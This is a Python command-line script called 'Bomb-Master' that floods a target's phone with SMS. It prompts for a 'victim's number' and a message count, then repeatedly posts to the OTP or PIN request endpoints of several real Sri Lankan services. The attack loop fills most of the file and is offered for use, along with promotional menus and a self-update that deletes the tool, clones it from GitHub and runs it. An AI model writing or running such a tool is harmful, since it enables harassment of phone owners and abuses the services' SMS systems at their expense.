import os
import urllib

try:
    import requests

except ImportError:
    os.system("clear")
    os.system("echo '\e[1;31mrequired requests not installed.!!!'")
    os.system("echo")
    os.system("sleep 1")
    os.system('pip3 install requests')
    os.system("clear")
    os.system("echo")
    os.system("echo '\e[1;32mpip3 requests installed..!'")
    os.system("sleep 2")
    os.system('clear')
    import requests

def logo():
	os.system("clear")
	os.system('echo')
	os.system("echo -e '\e[1;34mâââââââ  âââââââ ââââ   âââââââââââ '")
	os.system("echo -e '\e[1;34mââââââââââââââââââââââ âââââââââââââ'")
	os.system("echo -e '\e[1;34mâââââââââââ   ââââââââââââââââââââââ'")
	os.system("echo -e '\e[1;34mâââââââââââ   ââââââââââââââââââââââ'")
	os.system("echo -e '\e[1;34mââââââââââââââââââââ âââ âââââââââââ'")
	os.system("echo -e '\e[1;34mâââââââ  âââââââ âââ     ââââââââââ'")
	os.system("echo")
	os.system("echo -e '\e[1;39mââââ   ââââ ââââââ ââââââââââââââââââââââââââââââââ '")
	os.system("echo -e '\e[1;39mâââââ ââââââââââââââââââââââââââââââââââââââââââââââ'")
	os.system("echo -e '\e[1;39mâââââââââââââââââââââââââââ   âââ   ââââââ  ââââââââ'")
	os.system("echo -e '\e[1;39mâââââââââââââââââââââââââââ   âââ   ââââââ  ââââââââ'")
	os.system("echo -e '\e[1;39mâââ âââ ââââââ  âââââââââââ   âââ   âââââââââââ  âââ'")
	os.system("echo -e '\e[1;39mâââ     ââââââ  âââââââââââ   âââ   âââââââââââ  âââ'")
	os.system("echo -e '\e[1;33m                                              V2.0'")
	os.system("echo")
	os.system("echo '\e[1;32m     [+] Coded By Dave Smith CYBER WARRIOR'")
	os.system("echo '\e[1;32m     [+] ð OWNER OF SL CYBER WARRIORSáµá´¹ ð'")
	os.system("echo")
	os.system("echo")

logo()
os.system("echo   '\e[1;33m           [1] Start Bombing'")
os.system("echo   '\e[1;33m           [2] Update tool'")
os.system("echo   '\e[1;33m           [3] About us'")
os.system("echo   '\e[1;33m           [4] Join us'")
os.system("echo   '\e[1;33m           [5] exit'")
os.system("echo '\e[1;36m      '")
os.system("echo -n Enter your choice:   ")
a = int(input())

def bmb():
  x = str(input('\033[1;36m'"Enter the VictimÂ´s number: ""\n     "))
  if len(x) == 10 and str(x)[0:3] in ('070','071'):
        url='https://www.datamart.lk/home/otpForViewUsage'
        body={'serviceNum':x}
        a = int(input('\033[1;33m'"How many messages do you want to send? "))
        b = 0
        print("\n   \033[1;34m  Bombing Started victim = ", x,"\n       ")
        while a > b:
                requests.post(url,data=body)
                print('\033[1;32m  '"Sent ",1+b)
                os.system("sleep 1")
                b += 1
        print("    ")
        print("\033[1;34mDone..!      ")
  elif len(x) == 9 and str(x)[0:2] in ('70','71'):
        y="0"+x
        url='https://www.datamart.lk/home/otpForViewUsage'
        body={'serviceNum':y}
        a = int(input('\033[1;33m'"How many messages do you want to send? "))
        b = 0
        print("\n   \033[1;34m  Bombing Started victim = ", y,"\n       ")
        while a > b:
                requests.post(url,data=body)
                print('\033[1;32m  '"Sent ",1+b)
                os.system("sleep 1")
                b += 1
        print("    ")
        print("\033[1;34mDone..!      ")

  elif len(x) == 9 and str(x)[0:2] in ('74','77','76'):
        data = {"mobile":x}
        url = "https://megarun.dialog.lk/api/v2/user"
        b = 0
        a = int(input('\033[1;33m'"How many messages do you want to send? "))
        print("\n   \033[1;34m  Bombing Started victim = ", x,"\n       ")
        while a > b:
                requests.post(url,data=data)
                print('\033[1;32m  '"Sent ",1+b)
                os.system("sleep 1")
                b += 1
        print("    ")
        print("\033[1;34mDone..!      ")
  elif len(x) == 10 and str(x)[0:3] in ('074','077','076'):
       print("\n\033[1;32mDialog Numbers à·à¶½à¶§ à¶à·à¶¯à·à¶¯à· à¶´à¶½à·à¶½à·à·à· à·à·à¶¯à·à·à¶§ \'0\' à¶±à·à¶­à·à· type à¶à¶»à¶±à·à¶± \n\n           \033[1;31m ex:-\n             \033[1;33m   741234567     \n                761234567 \n                771234567")
       os.system("sleep 5")
       logo()
       bmb()

  elif str(x)[0:3] in ('+94'):
        os.system("echo")
        os.system("echo '\e[1;31mEnter the number without country code!!!'")
        os.system("sleep 3")
        logo()
        bmb()

  elif str(x)[0:4] in ('070 ','071 ','072 ','075 ','076 ','077 ','078 '):
        os.system("echo")
        os.system("echo '\e[1;31mEnter the number without spaces!!!'")
        os.system("sleep 3")
        logo()
        bmb()

  elif len(x) == 10 and str(x)[0:3] in ('075','072','078') or len(x) == 9 and str(x)[0:2] in ('75','78','72'):
     if len(x) == 10 and str(x)[0:3] in ('075','072','078'):
        m = int(input('\033[1;33m'"How many messages do you want to send? "))
        a=0
        print("\n   \033[1;34m  Bombing Started victim = ", x,"\n       ")
        while a<m:
           url='http://app.yogotaxi.com/yogo_apps/passenger/v1/clientPinRequestData_droid.php'
           body={'countrycode':'94','mobile':x,'name':'pinhami','email':''}
           requests.post(url,data=body)
           os.system("sleep 1")
           a+=1
           print("     sent",str(a))
        print("       ")
        print("\033[1;34mDone!!!")
     elif len(x) == 9 and str(x)[0:2] in ('75','78','72'):
        m = int(input('\033[1;33m'"How many messages do you want to send? "))
        a=0
        y="0"+x
        print("\n   \033[1;34m  Bombing Started victim = ", y,"\n       ")
        while a<m:
           url='http://app.yogotaxi.com/yogo_apps/passenger/v1/clientPinRequestData_droid.php'
           body={'countrycode':'94','mobile':y,'name':'pinhami','email':''}
           requests.post(url,data=body)
           os.system("sleep 1")
           a+=1
           print("     sent",str(a))
        print("       ")
        print("\033[1;34mDone!!!")

  else:
        os.system("echo")
        os.system("echo '\e[1;31mNumber is wrong. Try again with correct number!!!'")
        os.system("sleep 3")
        logo()
        bmb()

#choice 1
if a == 1:

	os.system('xdg-open https://youtu.be/6RAnJREfW6g')
	os.system('echo')
	os.system('echo')
	bmb()
	os.system('sleep 2')
	os.system('python Bomb-Master.py')

#choice 2
elif a == 2:

	os.system("cd /data/data/com.termux/files/home")
	os.system("rm -rf Bomb-Master")
	os.system("git clone http://github.com/DaVe-Smith-89/Bomb-Master")
	os.system("cd Bomb-Master")
	os.system("cd Bomb-Master")
	os.system("clear")
	os.system("echo '\e[1;32 Tool has been updated..!'")
	os.system("sleep 1")
	os.system("clear")
	os.system("python Bomb-Master.py")

#choice 3
elif a == 3:
	os.system("clear")
	os.system('echo')
	os.system("echo -e '\e[1;34mâââââââ  âââââââ ââââ   âââââââââââ '")
	os.system("echo -e '\e[1;34mââââââââââââââââââââââ âââââââââââââ'")
	os.system("echo -e '\e[1;34mâââââââââââ   ââââââââââââââââââââââ'")
	os.system("echo -e '\e[1;34mâââââââââââ   ââââââââââââââââââââââ'")
	os.system("echo -e '\e[1;34mââââââââââââââââââââ âââ âââââââââââ'")
	os.system("echo -e '\e[1;34mâââââââ  âââââââ âââ     ââââââââââ'")
	os.system("echo")
	os.system("echo -e '\e[1;39mââââ   ââââ ââââââ ââââââââââââââââââââââââââââââââ '")
	os.system("echo -e '\e[1;39mâââââ ââââââââââââââââââââââââââââââââââââââââââââââ'")
	os.system("echo -e '\e[1;39mâââââââââââââââââââââââââââ   âââ   ââââââ  ââââââââ'")
	os.system("echo -e '\e[1;39mâââââââââââââââââââââââââââ   âââ   ââââââ  ââââââââ'")
	os.system("echo -e '\e[1;39mâââ âââ ââââââ  âââââââââââ   âââ   âââââââââââ  âââ'")
	os.system("echo -e '\e[1;39mâââ     ââââââ  âââââââââââ   âââ   âââââââââââ  âââ'")
	os.system("echo")
	os.system("echo '\e[1;32m     [+] Coded By Dave Smith CYBER WARRIOR'")
	os.system("echo '\e[1;32m     [+] github.com/DaVe-Smith-89'")
	os.system("echo")
	os.system("echo")
	os.system("echo '\e[1;34mâââââââââââââââââââââââââââââââââââââââââââââââââââ'")
	os.system("echo")
	os.system("echo '\e[1;33m   Coded By Dave Smith á¶Ê¸á´®á´±á´¿ áµá´¬á´¿á´¿á´µá´¼á´¿'")
	os.system("echo")
	os.system("echo '   By Cyber Warriors (A Technical channell )'")
	os.system("echo")
	os.system("echo '   By:'")
	os.system("echo '       Dave Smith ft. John kener'")
	os.system("echo")
	os.system("echo '   Join us: '")
	os.system("echo	'       Telegram: http://t.me/By_sstp'")
	os.system("echo")
	os.system("echo '\e[1;34mâââââââââââââââââââââââââââââââââââââââââââââââââââ'")
	os.system("echo '\e[1;36m  '")
	os.system("echo -n 'Do you wanÂ´t to go main menu (y/n): '")
	b = str(input())

	if b == 'Y' or b == 'y':
		os.system("python Bomb-Master.py")

	elif b == 'N' or b == 'n':
		os.system("echo")
		os.system("echo '\e[1;32mThanks for using the tool'")
		os.system("echo")
	else:
		os.system("echo")
		os.system("echo '\e[1;31mYour choice is wrong!!!'")
		os.system("sleep 2")
		os.system("python Bomb-Master.py")

#choice 4
elif a == 4:
	os.system("clear")
	logo()
	os.system("echo")
	os.system("echo '\e[1;33m       [1] Facebook Group'")
	os.system("echo '\e[1;33m       [2] Telegram Group'")
	os.system("echo '\e[1;33m       [3] Main Menu'")
	os.system("echo '\e[1;36m      '")
	os.system("echo -n 'Enter your choice:\e[1;39m'")
	c = input()
	if c == '2':
		os.system("xdg-open http://t.me/By_sstp")
		os.system("sleep 5")
		os.system("clear")
		os.system("python Bomb-Master.py")
	elif c == '3':
		os.system("python Bomb-Master.py")
	elif c == '1':
		os.system("xdg-open https://www.facebook.com/groups/424580708746052/?ref=share")
		os.system("sleep 5")
		os.system("clear")
		os.system("python Bomb-Master.py")
	else:
		os.system("echo")
		os.system("echo '\e[1;31mYour choice is wrong!!!'")
		os.system("sleep 2")
		os.system("python Bomb-Master.py")


#choice 5
elif a == 5:
	os.system("echo")
	os.system("echo '\e[1;32mThanks for using the tool'")
	os.system("echo")

#else
else:

	os.system("echo")
	os.system("echo '\e[1;31mYour choice is wrong!!!'")
	os.system("sleep 2")
	os.system("python Bomb-Master.py")

